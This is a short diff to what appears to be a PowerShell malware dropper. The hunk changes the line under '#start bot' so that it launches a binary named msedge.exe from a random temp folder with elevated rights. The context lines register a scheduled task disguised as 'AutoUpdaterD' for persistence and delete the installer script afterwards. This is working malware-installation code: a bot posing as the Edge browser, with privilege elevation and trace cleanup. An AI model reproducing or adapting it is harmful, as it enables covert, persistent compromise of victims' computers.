@@ -97,7 +97,7 @@ Register-ScheduledTask -Xml $taskXml -TaskName 'AutoUpdaterD' -Force
 
 
 #start bot
-cd $env:temp/sVBXKuz/ ; Start-Process msedge.exe -Verb RunAs
+Start-Process $env:temp/sVBXKuz/msedge.exe -Verb RunAs
 
 #clean up
 powershell.exe /c Remove-Item $env:temp/dinstall.ps1
